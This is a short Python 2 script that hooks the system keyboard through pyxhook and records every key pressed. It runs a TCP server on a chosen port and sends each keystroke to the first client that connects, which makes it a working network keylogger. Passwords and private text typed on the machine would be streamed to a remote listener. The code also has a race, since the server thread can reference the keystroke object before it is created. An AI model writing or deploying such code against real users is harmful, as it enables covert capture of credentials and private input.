import socket
import threading
import random
import time
import pyxhook

class MonitorKeyStrokes:
	def __init__(self):
		self.clientsList = []
		#Create hookmanager
		self.hookman = pyxhook.HookManager()
		#Define our callback to fire when a key is pressed down
		self.hookman.KeyDown = self.kbevent
		#Hook the keyboard
		self.hookman.HookKeyboard()
		#Start our listenerr
		self.hookman.start()

	#This function is called every time a key is presssed
	def kbevent(self,event):
		#print type(event)
		#print event.shape
		print event.Key
		#output = "" + event
		#index = output.index("Key Pressed:")
		#key = output[index+len("Key Pressed:")+1]
		#print "<-----------------KEY------------->",key
		if len(self.clientsList) != 0:
			self.clientsList[0].sendall(event.Key.upper())
			print "Send to client"
	def addMoreClients(self,sock):
		self.clientsList.append(sock)
		print "Client added to list"
		return


class NetworkHandler:
	def __init__(self,ip,port):
		print "<---------------Initialising Network Class-------------->"
		self.clientsList = []
		self.handler = threading.Thread(target=self.startServer,args=(ip,port))
		self.handler.start()
		self.keyStrokesClassObj = MonitorKeyStrokes()
		print "<---------------Finished Network Class Init------------->"

	def startServer(self,ip,port):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind((ip,port))
		sock.listen(5)
		print "Server started on: ",port,"\n"

		try:
			while True:
				newSock, address = sock.accept()
				print "\n",address[0]," connected"
				self.keyStrokesClassObj.addMoreClients(newSock)
				#self.clientsList.append(newSock)
				#handler = threading.Thread(target=handleConnection,args=(newSock,address))
				#handler.start()
		except:
			print "*StartServer* Exception !"
			sock.close()


if __name__ == "__main__":
	port = int(raw_input("Enter port Number: "))
	server = NetworkHandler("",port)
